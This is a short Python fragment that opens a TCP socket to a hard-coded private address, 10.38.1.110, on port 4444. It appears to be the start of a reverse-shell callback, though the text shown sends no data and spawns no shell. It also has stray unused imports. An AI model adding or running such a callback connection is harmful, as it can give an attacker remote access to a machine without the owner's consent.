from multiprocessing import connection
import socket
from sqlite3 import connect

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.38.1.110", 4444))